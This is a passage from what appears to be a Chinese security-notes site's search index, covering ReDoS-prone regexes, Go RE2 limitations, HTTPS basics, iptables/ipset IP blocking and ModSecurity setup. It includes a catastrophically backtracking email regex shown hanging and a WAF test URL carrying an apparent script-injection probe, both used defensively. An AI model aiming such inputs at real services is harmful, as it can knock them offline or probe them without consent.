/^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/; console.log(regex.test(testString1)); // expected output: true console.log(regex.test(testString2)); // expected output: hang/FATAL EXCEPTION","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"application-security/sdl/go-scp/#_68","text":"\u5982\u679c\u60a8\u5177\u6709\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00(\u5982Perl\u3001Python\u3001PHP\u6216JavaScript)\u7684\u80cc\u666f\uff0c\u5219\u5e94\u8be5\u4e86\u89e3\u6b63\u5219\u8868\u8fbe\u5f0f\u652f\u6301\u7684\u7279\u6027\u4e4b\u95f4\u7684\u5dee\u5f02\u3002 RE2\u4e0d\u652f\u6301\u53ea\u6709\u56de\u6eaf\u89e3\u51b3\u65b9\u6848\u5b58\u5728\u7684\u6784\u9020\uff0c\u4f8b\u5982 \u56de\u6eaf\u5f15\u7528 \u548c \u67e5\u627e \u3002 \u8003\u8651\u4ee5\u4e0b\u95ee\u9898\uff1a\u9a8c\u8bc1\u4efb\u610f\u5b57\u7b26\u4e32\u662f\u5426\u662f\u683c\u5f0f\u6b63\u786e\u7684HTML\u6807\u8bb0\uff1aa)\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u8bb0\u540d\u79f0\u5339\u914d\uff0cb)\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u8bb0\u4e4b\u95f4\u53ef\u4ee5\u6709\u4e00\u4e9b\u6587\u672c\u3002 \u6ee1\u8db3\u8981\u6c42b)\u5f88\u7b80\u5355 .*? \uff0c\u4f46\u662fa)\u5177\u6709\u6311\u6218\u6027\uff0c\u56e0\u4e3a\u7ed3\u675f\u6807\u8bb0\u5339\u914d\u53d6\u51b3\u4e8e\u5339\u914d\u7684\u5f00\u5934\u6807\u8bb0\u3002 \u8fd9\u6b63\u662fBackreferences\u5141\u8bb8\u6211\u4eec\u505a\u7684\u4e8b\u60c5\u3002 \u68c0\u67e5\u4e0b\u9762\u7684JavaScript\u5b9e\u73b0\uff1a const testString1 = ' h1 Go Secure Coding Practices Guide /h1 '; const testString2 = ' p Go Secure Coding Practices Guide /p '; const testString3 = ' h1 Go Secure Coding Practices Guid /p '; const regex = / ([a-z][a-z0-9]*)\\b[^ ]* .*? \\/\\1 /; console.log(regex.test(testString1)); // expected output: true console.log(regex.test(testString2)); // expected output: true console.log(regex.test(testString3)); // expected output: false \\1 \u5c06\u4fdd\u5b58 ([A-Z][A-Z0-9]*) \u5148\u524d\u6355\u83b7\u7684\u503c\u3002 \u8fd9\u662f\u4f60\u4e0d\u5e94\u8be5\u671f\u671b\u5728Go\u4e2d\u505a\u7684\u4e8b\u60c5\uff1a package main import ( fmt regexp ) func main() { testString1 := h1 Go Secure Coding Practices Guide /h1 testString2 := p Go Secure Coding Practices Guide /p testString3 := h1 Go Secure Coding Practices Guid /p regex := regexp.MustCompile( ([a-z][a-z0-9]*)\\b[^ ]* .*? \\/\\1 ) fmt.Println(regex.MatchString(testString1)) fmt.Println(regex.MatchString(testString2)) fmt.Println(regex.MatchString(testString3)) } \u8fd0\u884c\u4e0a\u9762\u7684Go\u6e90\u4ee3\u7801\u793a\u4f8b\u5e94\u8be5\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u9519\u8bef\uff1a $ go run src/backreference.go # command-line-arguments src/backreference.go:12:64: unknown escape sequence src/backreference.go:12:67: non-octal character in escape sequence: \u4f60\u53ef\u80fd\u4f1a\u60f3\u8981\u4fee\u590d\u8fd9\u4e9b\u9519\u8bef\uff0c\u5e76\u63d0\u51fa\u4ee5\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a ([a-z][a-z0-9]*)\\b[^ ]* .*? \\\\/\\\\1 \u7136\u540e\uff0c\u4f60\u5c06\u5f97\u5230\uff1a go run src/backreference.go panic: regexp: Compile( ([a-z][a-z0-9]*)\\b[^ ]* .*? \\\\/\\\\1 ): error parsing regexp: invalid escape sequence: `\\1` goroutine 1 [running]: regexp.MustCompile(0x4de780, 0x21, 0xc00000e1f0) /usr/local/go/src/regexp/regexp.go:245 +0x171 main.main() /go/src/backreference.go:12 +0x3a exit status 2 \u5728\u4ece\u5934\u5f00\u59cb\u5f00\u53d1\u4e00\u4e9b\u4e1c\u897f\u65f6\uff0c\u4f60\u53ef\u80fd\u4f1a\u5728\u7f3a\u5c11\u4e00\u4e9b\u7279\u6027\u65f6\uff0c\u53d1\u73b0\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u79fb\u690d\u73b0\u6709\u8f6f\u4ef6\uff0c\u4f60\u53ef\u80fd\u4f1a\u5bfb\u627e\u6807\u51c6\u6b63\u5219\u8868\u8fbe\u5f0f\u5305\u7684\u5b8c\u6574\u529f\u80fd\u66ff\u4ee3\u65b9\u6848\uff0c\u53ef\u80fd\u4f1a\u627e\u5230(\u4f8b\u5982\uff1a dlclark / regexp2 )\u3002\u8bf7\u8bb0\u4f4f\uff0c\u4f60\u53ef\u80fd\u4f1a\u5931\u53bbRE2\u7684\u201c\u5b89\u5168\u7279\u6027\u201d\uff0c\u6bd4\u5982\u7ebf\u6027\u65f6\u95f4\u6027\u80fd\u3002","title":"\u5c11\u4e86\u4ec0\u4e48"},{"location":"application-security/security-defense/https/","text":"\u5168\u7ad9https \u4e3a\u4ec0\u4e48\u4f7f\u7528https http\u7684\u7f3a\u70b9 \u901a\u4fe1\u660e\u6587\u4f20\u8f93\uff0c\u5185\u5bb9\u53ef\u80fd\u88ab\u7a83\u542c\uff1b \u65e0\u6cd5\u9a8c\u8bc1\u5ba2\u6237\u7aef\u8eab\u4efd\uff0c\u53ef\u80fd\u88ab\u4f2a\u88c5\uff1b \u65e0\u6cd5\u9a8c\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u53ef\u80fd\u88ab\u7be1\u6539\uff1b \u5982\u4f55\u89e3\u51b3http\u7684\u7f3a\u70b9 \u52a0\u5bc6\u9632\u6b62\u7a83\u542c\uff1b \u901a\u4fe1\u52a0\u5bc6\uff1ahttp\u672c\u8eab\u6ca1\u6709\u52a0\u5bc6\u673a\u5236\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528SSL(\u5b89\u5168\u5957\u63a5\u5c42)\u548cTLS(\u5b89\u5168\u4f20\u8f93\u5c42)\u6280\u672f\u5b9e\u73b0\u901a\u4fe1\u7684\u6574\u4e2a\u52a0\u5bc6\uff1b \u4f7f\u7528\u8bc1\u4e66\u67e5\u660e\u5bf9\u65b9\u8eab\u4efd\uff0c\u8bc1\u4e66\u7531\u503c\u5f97\u4fe1\u8d56\u7684\u7b2c\u4e09\u65b9\u673a\u6784\u9881\u53d1\uff1b \u4f7f\u7528SSL\u63d0\u4f9b\u6458\u8981\u529f\u80fd\uff1b \u884d\u751f\u7684https http+\u52a0\u5bc6+\u8ba4\u8bc1+\u5b8c\u6574\u6027\u4fdd\u62a4=https\uff1b https\u4e0d\u662f\u5e94\u7528\u5c42\u7684\u4e00\u79cd\u65b0\u534f\u8bae\uff0c\u53ea\u662fhttp\u901a\u4fe1\u63a5\u53e3\u90e8\u5206\u7528ssl\u6216tls\u534f\u8bae\u66ff\u6362\uff0c\u901a\u4fd7\u7684\u8bf4https\u5c31\u662fhttp\u5916\u8fb9\u5957\u4e86\u4e00\u5c42\u58f3\uff1b https\u7684\u7b97\u6cd5 \u5bf9\u79f0\u7b97\u6cd5\uff1a\u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u52a0\u89e3\u5bc6\u901f\u5ea6\u5feb\uff0c\u4ee3\u8868\uff1aDES\u3001AES\uff1b \u975e\u5bf9\u79f0\u7b97\u6cd5\uff1a\u5bc6\u94a5\u6210\u5bf9\u51fa\u73b0\uff0c\u52a0\u89e3\u5bc6\u4f7f\u7528\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u516c\u94a5\u52a0\u5bc6\u79c1\u94a5\u89e3\u5bc6\uff0c\u79c1\u94a5\u52a0\u5bc6\u516c\u94a5\u89e3\u5bc6\uff0c\u52a0\u5bc6\u901f\u5ea6\u6162\uff0c\u4ee3\u8868\uff1aRSA\u3001DSA\uff1b https\u7684\u4f20\u8f93\u8fc7\u7a0b \u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u7ed9\u670d\u52a1\u5668\uff1b \u670d\u52a1\u5668\u5c06\u81ea\u5df1\u7684\u8bc1\u4e66(\u7531CA\u7b7e\u53d1\uff0c\u540c\u65f6\u5305\u542b\u670d\u52a1\u5668\u516c\u94a5)\u3001\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u79cd\u7c7b\u53ca\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\u8fd4\u56de\u5ba2\u6237\u7aef\uff1b \u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u6bd4\u8f83\u8bc1\u4e66\u91cc\u7684\u4fe1\u606f\uff0c\u5982\u8bc1\u4e66\u6709\u6548\u671f\u3001\u670d\u52a1\u5668\u57df\u540d\u548c\u516c\u94a5\uff0c\u662f\u5426\u7531\u4fe1\u4efb\u7684CA\u7b7e\u53d1\uff0c\u5982\u679c\u4e00\u81f4\uff0c\u5219\u6d4f\u89c8\u5668\u5b8c\u6210\u5bf9\u670d\u52a1\u5668\u7684\u8eab\u4efd\u8ba4\u8bc1\u3002\u5426\u5219\u7ed9\u5ba2\u6237\u4e00\u4e2a\u8b66\u544a\u4fe1\u606f\uff1a\u8be2\u95ee\u662f\u5426\u7ee7\u7eed\u8bbf\u95ee\uff1b \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u5ba2\u6237\u7aef\u8bc1\u4e66\uff08\u5305\u542b\u5ba2\u6237\u7aef\u516c\u94a5\uff09\u3001\u652f\u6301\u7684\u5bf9\u79f0\u52a0\u5bc6\u65b9\u6848\u53ca\u5176\u4ed6\u4fe1\u606f\u3002\u670d\u52a1\u5668\u6536\u5230\u540e\uff0c\u8fdb\u884c\u76f8\u540c\u7684\u8eab\u4efd\u8ba4\u8bc1\uff0c\u82e5\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5219\u62d2\u7edd\u8fde\u63a5\uff1b \u670d\u52a1\u5668\u6839\u636e\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u53d1\u9001\u7684\u5bc6\u7801\u79cd\u7c7b\uff0c\u9009\u62e9\u4e00\u79cd\u52a0\u5bc6\u65b9\u6848\uff0c\u7528\u5ba2\u6237\u7aef\u516c\u94a5\u52a0\u5bc6\u540e\u901a\u77e5\u5230\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\uff1b \u5ba2\u6237\u7aef\u901a\u8fc7\u79c1\u94a5\u89e3\u5bc6\u540e\uff0c\u5f97\u77e5\u670d\u52a1\u5668\u9009\u62e9\u7684\u52a0\u5bc6\u65b9\u6848\uff0c\u5e76\u9009\u62e9\u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u63a5\u7740\u7528\u670d\u52a1\u5668\u516c\u94a5\u52a0\u5bc6\u540e\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff1b \u670d\u52a1\u5668\u63a5\u6536\u5230\u6d4f\u89c8\u5668\u4f20\u9001\u7684\u6d88\u606f\uff0c\u7528\u79c1\u94a5\u89e3\u5bc6\uff0c\u83b7\u5f97\u901a\u8bdd\u5bc6\u94a5key\uff1b \u63a5\u4e0b\u6765\u7684\u6570\u636e\u4f20\u8f93\u90fd\u4f7f\u7528\u8be5\u5bf9\u79f0\u5bc6\u94a5key\u8fdb\u884c\u52a0\u5bc6\uff1b \u53c2\u8003\u8d44\u6599 \u5168\u7ad9 HTTPS \u6ca1\u4f60\u60f3\u8c61\u7684\u90a3\u4e48\u7b80\u5355 \u5168\u7ad9HTTPS\u7684\u90a3\u4e9b\u5751 \u542f\u7528\u5168\u7ad9HTTPS\u540e\u4e0d\u4ec5\u66f4\u5b89\u5168\u800c\u4e14\u66f4\u5feb \u770b\u6dd8\u5b9d\u662f\u5982\u4f55\u505a\u5230\u7684","title":"\u5168\u7ad9https"},{"location":"application-security/security-defense/https/#https","text":"","title":"\u5168\u7ad9https"},{"location":"application-security/security-defense/https/#https_1","text":"","title":"\u4e3a\u4ec0\u4e48\u4f7f\u7528https"},{"location":"application-security/security-defense/https/#http","text":"\u901a\u4fe1\u660e\u6587\u4f20\u8f93\uff0c\u5185\u5bb9\u53ef\u80fd\u88ab\u7a83\u542c\uff1b \u65e0\u6cd5\u9a8c\u8bc1\u5ba2\u6237\u7aef\u8eab\u4efd\uff0c\u53ef\u80fd\u88ab\u4f2a\u88c5\uff1b \u65e0\u6cd5\u9a8c\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u53ef\u80fd\u88ab\u7be1\u6539\uff1b","title":"http\u7684\u7f3a\u70b9"},{"location":"application-security/security-defense/https/#http_1","text":"\u52a0\u5bc6\u9632\u6b62\u7a83\u542c\uff1b \u901a\u4fe1\u52a0\u5bc6\uff1ahttp\u672c\u8eab\u6ca1\u6709\u52a0\u5bc6\u673a\u5236\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528SSL(\u5b89\u5168\u5957\u63a5\u5c42)\u548cTLS(\u5b89\u5168\u4f20\u8f93\u5c42)\u6280\u672f\u5b9e\u73b0\u901a\u4fe1\u7684\u6574\u4e2a\u52a0\u5bc6\uff1b \u4f7f\u7528\u8bc1\u4e66\u67e5\u660e\u5bf9\u65b9\u8eab\u4efd\uff0c\u8bc1\u4e66\u7531\u503c\u5f97\u4fe1\u8d56\u7684\u7b2c\u4e09\u65b9\u673a\u6784\u9881\u53d1\uff1b \u4f7f\u7528SSL\u63d0\u4f9b\u6458\u8981\u529f\u80fd\uff1b","title":"\u5982\u4f55\u89e3\u51b3http\u7684\u7f3a\u70b9"},{"location":"application-security/security-defense/https/#https_2","text":"http+\u52a0\u5bc6+\u8ba4\u8bc1+\u5b8c\u6574\u6027\u4fdd\u62a4=https\uff1b https\u4e0d\u662f\u5e94\u7528\u5c42\u7684\u4e00\u79cd\u65b0\u534f\u8bae\uff0c\u53ea\u662fhttp\u901a\u4fe1\u63a5\u53e3\u90e8\u5206\u7528ssl\u6216tls\u534f\u8bae\u66ff\u6362\uff0c\u901a\u4fd7\u7684\u8bf4https\u5c31\u662fhttp\u5916\u8fb9\u5957\u4e86\u4e00\u5c42\u58f3\uff1b","title":"\u884d\u751f\u7684https"},{"location":"application-security/security-defense/https/#https_3","text":"\u5bf9\u79f0\u7b97\u6cd5\uff1a\u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u52a0\u89e3\u5bc6\u901f\u5ea6\u5feb\uff0c\u4ee3\u8868\uff1aDES\u3001AES\uff1b \u975e\u5bf9\u79f0\u7b97\u6cd5\uff1a\u5bc6\u94a5\u6210\u5bf9\u51fa\u73b0\uff0c\u52a0\u89e3\u5bc6\u4f7f\u7528\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u516c\u94a5\u52a0\u5bc6\u79c1\u94a5\u89e3\u5bc6\uff0c\u79c1\u94a5\u52a0\u5bc6\u516c\u94a5\u89e3\u5bc6\uff0c\u52a0\u5bc6\u901f\u5ea6\u6162\uff0c\u4ee3\u8868\uff1aRSA\u3001DSA\uff1b","title":"https\u7684\u7b97\u6cd5"},{"location":"application-security/security-defense/https/#https_4","text":"\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u7ed9\u670d\u52a1\u5668\uff1b \u670d\u52a1\u5668\u5c06\u81ea\u5df1\u7684\u8bc1\u4e66(\u7531CA\u7b7e\u53d1\uff0c\u540c\u65f6\u5305\u542b\u670d\u52a1\u5668\u516c\u94a5)\u3001\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u79cd\u7c7b\u53ca\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\u8fd4\u56de\u5ba2\u6237\u7aef\uff1b \u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u6bd4\u8f83\u8bc1\u4e66\u91cc\u7684\u4fe1\u606f\uff0c\u5982\u8bc1\u4e66\u6709\u6548\u671f\u3001\u670d\u52a1\u5668\u57df\u540d\u548c\u516c\u94a5\uff0c\u662f\u5426\u7531\u4fe1\u4efb\u7684CA\u7b7e\u53d1\uff0c\u5982\u679c\u4e00\u81f4\uff0c\u5219\u6d4f\u89c8\u5668\u5b8c\u6210\u5bf9\u670d\u52a1\u5668\u7684\u8eab\u4efd\u8ba4\u8bc1\u3002\u5426\u5219\u7ed9\u5ba2\u6237\u4e00\u4e2a\u8b66\u544a\u4fe1\u606f\uff1a\u8be2\u95ee\u662f\u5426\u7ee7\u7eed\u8bbf\u95ee\uff1b \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u5ba2\u6237\u7aef\u8bc1\u4e66\uff08\u5305\u542b\u5ba2\u6237\u7aef\u516c\u94a5\uff09\u3001\u652f\u6301\u7684\u5bf9\u79f0\u52a0\u5bc6\u65b9\u6848\u53ca\u5176\u4ed6\u4fe1\u606f\u3002\u670d\u52a1\u5668\u6536\u5230\u540e\uff0c\u8fdb\u884c\u76f8\u540c\u7684\u8eab\u4efd\u8ba4\u8bc1\uff0c\u82e5\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5219\u62d2\u7edd\u8fde\u63a5\uff1b \u670d\u52a1\u5668\u6839\u636e\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u53d1\u9001\u7684\u5bc6\u7801\u79cd\u7c7b\uff0c\u9009\u62e9\u4e00\u79cd\u52a0\u5bc6\u65b9\u6848\uff0c\u7528\u5ba2\u6237\u7aef\u516c\u94a5\u52a0\u5bc6\u540e\u901a\u77e5\u5230\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\uff1b \u5ba2\u6237\u7aef\u901a\u8fc7\u79c1\u94a5\u89e3\u5bc6\u540e\uff0c\u5f97\u77e5\u670d\u52a1\u5668\u9009\u62e9\u7684\u52a0\u5bc6\u65b9\u6848\uff0c\u5e76\u9009\u62e9\u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u63a5\u7740\u7528\u670d\u52a1\u5668\u516c\u94a5\u52a0\u5bc6\u540e\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff1b \u670d\u52a1\u5668\u63a5\u6536\u5230\u6d4f\u89c8\u5668\u4f20\u9001\u7684\u6d88\u606f\uff0c\u7528\u79c1\u94a5\u89e3\u5bc6\uff0c\u83b7\u5f97\u901a\u8bdd\u5bc6\u94a5key\uff1b \u63a5\u4e0b\u6765\u7684\u6570\u636e\u4f20\u8f93\u90fd\u4f7f\u7528\u8be5\u5bf9\u79f0\u5bc6\u94a5key\u8fdb\u884c\u52a0\u5bc6\uff1b","title":"https\u7684\u4f20\u8f93\u8fc7\u7a0b"},{"location":"application-security/security-defense/https/#_1","text":"\u5168\u7ad9 HTTPS \u6ca1\u4f60\u60f3\u8c61\u7684\u90a3\u4e48\u7b80\u5355 \u5168\u7ad9HTTPS\u7684\u90a3\u4e9b\u5751 \u542f\u7528\u5168\u7ad9HTTPS\u540e\u4e0d\u4ec5\u66f4\u5b89\u5168\u800c\u4e14\u66f4\u5feb \u770b\u6dd8\u5b9d\u662f\u5982\u4f55\u505a\u5230\u7684","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-defense/iptables-waf/","text":"iptables-waf iptables\u5de5\u4f5c\u5728\u4e3b\u673a\u5c42\u9762\uff0c\u5bf9\u4e8e\u8fdb\u51fa\u7684\u7f51\u7edc\u6216\u8005\u4e3b\u673a\u7684\u6570\u636e\u62a5\u6587\uff0c\u6839\u636e\u4e8b\u5148\u8bbe\u5b9a\u597d\u7684\u68c0\u67e5\u89c4\u5219\u5bf9\u5176\u68c0\u67e5\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002 iptables\u5b9e\u73b0waf iptables\u62e6\u622aip # \u62e6\u622aip iptables -A INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP # \u5220\u9664\u62e6\u622a iptables -D INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP \u5229\u7528ipset\u8fdb\u884c\u6279\u91cfIP\u62e6\u622a # \u521b\u5efaip\u96c6 ipset create bloodzer0 hash:ip # \u67e5\u770bip\u96c6 ipset list # \u6dfb\u52a0\u6210\u5458 ipset add bloodzer0 ip # \u5220\u9664\u6210\u5458 ipset del bloodzer0 ip # \u5c06ipset\u4fdd\u5b58\u4e3a\u6587\u4ef6 ipset save bloodzer0 -f bloodzer0.txt # iptables\u4e0eipset\u7ed3\u5408 iptables -A INPUT -m set --match-set bloodzer0 src -p tcp --dport 80 -j DROP \u95ee\u9898\u601d\u8003 iptables\u5c01\u7981IP\uff0c\u662f\u5c01\u7981\u7684\u76f4\u8fdeIP\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4e0e\u670d\u52a1\u5668\u901a\u4fe1\u7684IP\u3002\u4f46\u662f\u6211\u4eec\u4e00\u822c\u7684\u7f51\u7edc\u67b6\u6784\u662f\uff1aCDN--SLB--Server\u6216\u8005CDN--Server\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u7684\u65b9\u5f0f\u5c31\u5931\u6548\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u91c7\u7528\u65b0\u7684\u65b9\u5f0f\uff1a\u6839\u636eXFF\u6765\u5c01\u7981IP\u3002 \u6839\u636eXFF+iptables\u5c01\u7981IP iptables -A INPUT -p tcp --dport 80 -m string --algo kmp --string X-Forwarded-For: IP -j DROP \u5907\u6ce8\uff1aXFF\u5f88\u597d\u4f2a\u9020\u7ed5\u8fc7\u3002 \u8e29\u5751\u8bb0 XFF+iptables\u5b9e\u73b0waf\u6027\u80fd\u74f6\u9888 \u8fd9\u79cd\u65b9\u5f0f\u5c31\u4e0d\u80fd\u4f7f\u7528ipset\uff0c\u6240\u4ee5\u5982\u679c\u662f\u4e1a\u52a1\u91cf\u5f88\u5927\u7684\u65f6\u5019\uff0c\u4e0d\u5efa\u8bae\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u56e0\u4e3a\u4e00\u4e2aIP\u4e00\u6761\u89c4\u5219\uff0c\u800ciptables\u4f1a\u9488\u5bf9INPUT\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u8fdb\u884c\u89e3\u6790\u5224\u65ad\u3002 \u6211\u6d4b\u8bd5\u8fc7\u4e00\u53f02\u683816G\u7684\u670d\u52a1\u5668\uff0c\u5728\u89c4\u5219\u6570\u91cf\u8fbe\u52302300+\u7684\u65f6\u5019\uff0cQPS\u7a0d\u5fae\u4e00\u5927\uff0c\u670d\u52a1\u5668CPU\u5bb9\u6613\u98d9\u523090%\u4ee5\u4e0a\u3002 \u53c2\u8003\u8d44\u6599","title":"iptables-waf"},{"location":"application-security/security-defense/iptables-waf/#iptables-waf","text":"iptables\u5de5\u4f5c\u5728\u4e3b\u673a\u5c42\u9762\uff0c\u5bf9\u4e8e\u8fdb\u51fa\u7684\u7f51\u7edc\u6216\u8005\u4e3b\u673a\u7684\u6570\u636e\u62a5\u6587\uff0c\u6839\u636e\u4e8b\u5148\u8bbe\u5b9a\u597d\u7684\u68c0\u67e5\u89c4\u5219\u5bf9\u5176\u68c0\u67e5\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002","title":"iptables-waf"},{"location":"application-security/security-defense/iptables-waf/#iptableswaf","text":"","title":"iptables\u5b9e\u73b0waf"},{"location":"application-security/security-defense/iptables-waf/#iptablesip","text":"# \u62e6\u622aip iptables -A INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP # \u5220\u9664\u62e6\u622a iptables -D INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP","title":"iptables\u62e6\u622aip"},{"location":"application-security/security-defense/iptables-waf/#ipsetip","text":"# \u521b\u5efaip\u96c6 ipset create bloodzer0 hash:ip # \u67e5\u770bip\u96c6 ipset list # \u6dfb\u52a0\u6210\u5458 ipset add bloodzer0 ip # \u5220\u9664\u6210\u5458 ipset del bloodzer0 ip # \u5c06ipset\u4fdd\u5b58\u4e3a\u6587\u4ef6 ipset save bloodzer0 -f bloodzer0.txt # iptables\u4e0eipset\u7ed3\u5408 iptables -A INPUT -m set --match-set bloodzer0 src -p tcp --dport 80 -j DROP","title":"\u5229\u7528ipset\u8fdb\u884c\u6279\u91cfIP\u62e6\u622a"},{"location":"application-security/security-defense/iptables-waf/#_1","text":"iptables\u5c01\u7981IP\uff0c\u662f\u5c01\u7981\u7684\u76f4\u8fdeIP\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4e0e\u670d\u52a1\u5668\u901a\u4fe1\u7684IP\u3002\u4f46\u662f\u6211\u4eec\u4e00\u822c\u7684\u7f51\u7edc\u67b6\u6784\u662f\uff1aCDN--SLB--Server\u6216\u8005CDN--Server\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u7684\u65b9\u5f0f\u5c31\u5931\u6548\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u91c7\u7528\u65b0\u7684\u65b9\u5f0f\uff1a\u6839\u636eXFF\u6765\u5c01\u7981IP\u3002","title":"\u95ee\u9898\u601d\u8003"},{"location":"application-security/security-defense/iptables-waf/#xffiptablesip","text":"iptables -A INPUT -p tcp --dport 80 -m string --algo kmp --string X-Forwarded-For: IP -j DROP \u5907\u6ce8\uff1aXFF\u5f88\u597d\u4f2a\u9020\u7ed5\u8fc7\u3002","title":"\u6839\u636eXFF+iptables\u5c01\u7981IP"},{"location":"application-security/security-defense/iptables-waf/#_2","text":"","title":"\u8e29\u5751\u8bb0"},{"location":"application-security/security-defense/iptables-waf/#xffiptableswaf","text":"\u8fd9\u79cd\u65b9\u5f0f\u5c31\u4e0d\u80fd\u4f7f\u7528ipset\uff0c\u6240\u4ee5\u5982\u679c\u662f\u4e1a\u52a1\u91cf\u5f88\u5927\u7684\u65f6\u5019\uff0c\u4e0d\u5efa\u8bae\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u56e0\u4e3a\u4e00\u4e2aIP\u4e00\u6761\u89c4\u5219\uff0c\u800ciptables\u4f1a\u9488\u5bf9INPUT\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u8fdb\u884c\u89e3\u6790\u5224\u65ad\u3002 \u6211\u6d4b\u8bd5\u8fc7\u4e00\u53f02\u683816G\u7684\u670d\u52a1\u5668\uff0c\u5728\u89c4\u5219\u6570\u91cf\u8fbe\u52302300+\u7684\u65f6\u5019\uff0cQPS\u7a0d\u5fae\u4e00\u5927\uff0c\u670d\u52a1\u5668CPU\u5bb9\u6613\u98d9\u523090%\u4ee5\u4e0a\u3002","title":"XFF+iptables\u5b9e\u73b0waf\u6027\u80fd\u74f6\u9888"},{"location":"application-security/security-defense/iptables-waf/#_3","text":"","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-defense/modsecurity-waf/","text":"modsecurity-waf \u5b89\u88c5\u4e0e\u4f7f\u7528 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u89e3\u51b3\u4f9d\u8d56\u73af\u5883 yum install gcc.x86_64 libxml2-devel.x86_64 httpd.x86_64 httpd-devel.x86_64 pcre2.x86_64 pcre2-devel.x86_64 -y # \u5b89\u88c5mod_security yum install mod_security.x86_64 -y # \u67e5\u770bhttp \u6a21\u5757\uff0c\u7ed3\u679c\u5982\u56fe httpd -M | grep security # \u542f\u52a8\u670d\u52a1 systemctl start httpd.service # mod_security\u914d\u7f6e\u6587\u4ef6 /etc/httpd/conf.d/mod_security.conf # \u89c4\u5219\u76ee\u5f55 /etc/httpd/modsecurity.d/activated_rules # \u5b89\u88c5mod_security\u89c4\u5219 yum -y install mod_security_crs # \u67e5\u770b\u89c4\u5219 # \u6d4b\u8bd5url\uff1ahttp://10.10.10.5/ script # \u67e5\u770b\u65e5\u5fd7 tail -n 1 -f /etc/httpd/logs/error_log # \u67e5\u770b\u6a21\u5757\u65e5\u5fd7 tail -f /var/log/httpd/modsec_audit.log ModSecurity\u63a7\u5236\u53f0waf-fle \u5b98\u7f51\u5730\u5740 \u5728\u7ebf\u6d4b\u8bd5\u5730\u5740 \u6d4b\u8bd5\u8d26\u53f7\uff1awaffle-demo \u6d4b\u8bd5\u5bc6\u7801\uff1awaffle-demo \u53c2\u8003\u8d44\u6599 owasp mod_security","title":"modsecurity-waf"},{"location":"application-security/security-defense/modsecurity-waf/#modsecurity-waf","text":"","title":"modsecurity-waf"},{"location":"application-security/security-defense/modsecurity-waf/#_1","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u89e3\u51b3\u4f9d\u8d56\u73af\u5883 yum install gcc.x86_64 libxml2-devel.x86_64 httpd.x86_64 httpd-devel.x86_64 pcre2.x86_64 pcre2-devel.x86_64 -y # \u5b89\u88c5mod_security yum install mod_security.x86_64 -y # \u67e5\u770bhttp \u6a21\u5757\uff0c\u7ed3\u679c\u5982\u56fe httpd -M | grep security # 